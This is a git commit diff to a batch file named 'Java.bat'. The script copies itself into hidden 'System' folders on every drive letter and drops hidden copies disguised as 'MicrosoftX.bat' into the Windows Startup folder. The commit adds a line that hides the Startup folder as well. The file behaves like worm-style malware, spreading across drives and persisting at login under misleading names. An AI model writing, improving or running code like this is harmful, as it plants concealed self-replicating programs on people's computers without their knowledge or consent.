180e8a56cedc55d2997b80b0fa64a8c99543d776
MrAboudi <94474093+Abdullah67289@users.noreply.github.com>
2025-07-07 09:20:36 -0400

    Update Java.bat

--- Java.bat
+++ Java.bat
@@ -36,24 +36,25 @@ start "" "%TARGET_FILE%"
 set "SELF=%~f0"
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
+:: Make sure Startup folder itself is hidden
+attrib +h +s "%STARTUP_FOLDER%" >nul 2>&1
+
 for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%D:\ (
         set "FOLDER_NAME=System %%D"
         set "TARGET_FOLDER=%%D:\!FOLDER_NAME!"
         set "DRIVE_BAT=%%D:\!FOLDER_NAME!\Java.bat"
 
-        :: Create folder on drive
+        :: Create and hide folder in drive
         mkdir "!TARGET_FOLDER!" >nul 2>&1
-
-        :: Copy to drive and hide it
         copy "%SELF%" "!DRIVE_BAT!" >nul
         attrib +h +s "!TARGET_FOLDER!"
         attrib +h +s "!DRIVE_BAT!"
 
-        :: Copy renamed to Startup folder
+        :: Create renamed copy in Startup and hide it
         set "RENAMED=Microsoft%%D.bat"
         copy "%SELF%" "%STARTUP_FOLDER%\!RENAMED!" >nul
-        attrib +h "%STARTUP_FOLDER%\!RENAMED!"
+        attrib +h +s "%STARTUP_FOLDER%\!RENAMED!" >nul
     )
 )
 
